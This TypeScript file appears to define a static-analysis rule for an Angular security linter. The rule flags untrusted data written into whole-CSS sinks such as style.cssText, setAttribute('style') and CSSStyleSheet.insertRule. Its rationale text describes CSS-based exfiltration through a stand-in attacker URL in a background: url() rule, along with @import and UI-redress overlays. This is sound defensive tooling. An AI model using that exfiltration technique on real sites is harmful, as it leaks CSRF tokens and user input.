import type * as ts from 'typescript';
import { defineRule, type AnalysisContext, type RuleFinding } from '@ngbastion/plugin-api';
import { domElement, is, memberName, receiverOf, reportSink, strip } from '../shared/common.js';

interface CssSink {
  node: ts.Node;
  value: ts.Expression;
  description: string;
  certain: boolean;
}

const isStyleDecl = (ctx: AnalysisContext, e: ts.Expression) => is(ctx.symbols.typeOrigin(e), 'dom', 'CSSStyleDeclaration');

/** Sinks that accept whole CSS declarations or style sheets. */
function cssSinks(ctx: AnalysisContext): CssSink[] {
  const t = ctx.ts;
  const out: CssSink[] = [];
  for (const a of ctx.index.assignments) {
    if (a.operatorToken.kind !== t.SyntaxKind.EqualsToken && a.operatorToken.kind !== t.SyntaxKind.PlusEqualsToken) continue;
    const left = strip(ctx, a.left);
    const name = memberName(ctx, left);
    const recv = receiverOf(ctx, left);
    if (!recv) continue;
    // el.style.cssText = v
    if (name === 'cssText' && isStyleDecl(ctx, recv)) out.push({ node: a, value: a.right, description: 'style.cssText assignment', certain: true });
    // el.style = v (string assignment sets cssText)
    else if (name === 'style' && domElement(ctx, recv)?.certain && !isStyleDecl(ctx, a.right)) out.push({ node: a, value: a.right, description: 'element.style assignment', certain: true });
    // styleElement.textContent / innerText = v
    else if ((name === 'textContent' || name === 'innerText') && is(ctx.symbols.typeOrigin(recv), 'dom', 'HTMLStyleElement')) out.push({ node: a, value: a.right, description: `<style>.${name} assignment`, certain: true });
  }
  for (const call of ctx.index.calls) {
    const info = ctx.symbols.callee(call);
    if (!info || info.declaration) continue;
    const args = call.arguments;
    const recv = receiverOf(ctx, strip(ctx, call.expression));
    if (info.name === 'setAttribute' && args[1] && /^style$/i.test(ctx.symbols.constantString(args[0]!) ?? '') && recv && domElement(ctx, recv)) {
      out.push({ node: call, value: args[1], description: "setAttribute('style')", certain: !!domElement(ctx, recv)?.certain });
    } else if (info.name === 'setAttribute' && args[2] && is(info.receiver, '@angular/core', 'Renderer2') && /^style$/i.test(ctx.symbols.constantString(args[1]!) ?? '')) {
      out.push({ node: call, value: args[2], description: "Renderer2.setAttribute(el, 'style')", certain: true });
    } else if (info.name === 'insertRule' && args[0] && is(info.receiver, 'dom', 'CSSStyleSheet', 'CSSGroupingRule', 'CSSMediaRule')) {
      out.push({ node: call, value: args[0], description: 'CSSStyleSheet.insertRule()', certain: true });
    } else if ((info.name === 'replace' || info.name === 'replaceSync') && args[0] && is(info.receiver, 'dom', 'CSSStyleSheet')) {
      out.push({ node: call, value: args[0], description: `CSSStyleSheet.${info.name}()`, certain: true });
    }
  }
  return out;
}

export const ngb064 = defineRule({
  meta: {
    id: 'NGB064',
    name: 'Untrusted CSS injection',
    category: 'angular-xss',
    defaultSeverity: 'medium',
    cwe: ['CWE-79', 'CWE-74'],
    docs: {
      description:
        "Traces untrusted data (URL parameters, postMessage data, storage, HTTP responses, user input) into sinks that accept whole CSS declarations or style sheets: `style.cssText`, `element.style = …`, `setAttribute('style', …)` (DOM and `Renderer2`), `<style>` element text, `CSSStyleSheet.insertRule()` / `replace()` / `replaceSync()`. Single property values set with `style.setProperty(name, value)` / `Renderer2.setStyle()` are not reported.",
      rationale:
        "Browsers no longer run script from CSS, but injected style sheets remain an attack primitive: attribute selectors with `background: url(https://attacker/?c=a)` exfiltrate CSRF tokens and input values character by character, `@import` loads attacker CSS, and overlays restyle the page for clickjacking or fake login prompts. Angular does not sanitize styles that are written to the DOM directly.",
      patterns: [
        '`el.style.cssText = v`, `el.style = v`, `el.setAttribute("style", v)`, `renderer.setAttribute(el, "style", v)`',
        '`styleEl.textContent = v` / `innerText` on an `HTMLStyleElement`',
        '`sheet.insertRule(v)`, `sheet.replace(v)`, `sheet.replaceSync(v)` on `CSSStyleSheet`',
        'Data-flow evidence required: values whose origin cannot be resolved are not reported',
      ],
      limitations: [
        'Template bindings (`[style]="css"`, `[attr.style]`) are not traced.',
        'Validation of the CSS text (allowlisting properties, parsing) is not recognized; a project sanitizer can be listed in `trustedSanitizers`.',
      ],
      falsePositives: [
        'Theme editors that intentionally accept CSS from the signed-in user only affect that user (self-XSS-like); document an exception if CSS is never shared between users.',
      ],
      remediation:
        'Never build style sheets from untrusted text. Map user choices to known values (`const THEMES = { dark: …, light: … }`) or set single, validated properties with `style.setProperty("--accent", color)` after checking the value against a strict pattern (`/^#[0-9a-f]{6}$/i`).',
      example: {
        unsafe: `this.styleEl.textContent = this.route.snapshot.queryParams['theme'];`,
        safe: `const color = this.route.snapshot.queryParams['accent'];
if (/^#[0-9a-f]{6}$/i.test(color)) this.host.nativeElement.style.setProperty('--accent', color);`,
      },
      references: [
        { title: 'PortSwigger — CSS injection', url: 'https://portswigger.net/research/blind-css-exfiltration' },
        { title: 'OWASP WSTG — Testing for CSS Injection', url: 'https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/11-Client-side_Testing/05-Testing_for_CSS_Injection' },
      ],
    },
  },
  analyze(ctx) {
    const findings: RuleFinding[] = [];
    for (const s of cssSinks(ctx)) {
      findings.push(...reportSink({
        ctx,
        sink: s.node,
        value: s.value,
        context: 'generic',
        sinkDescription: s.description,
        sinkCertain: s.certain,
        message: (f) => `Untrusted data (${f.source.description}) is written as CSS through ${s.description}; injected style rules can exfiltrate page data or redress the UI.`,
      }));
    }
    return findings;
  },
});
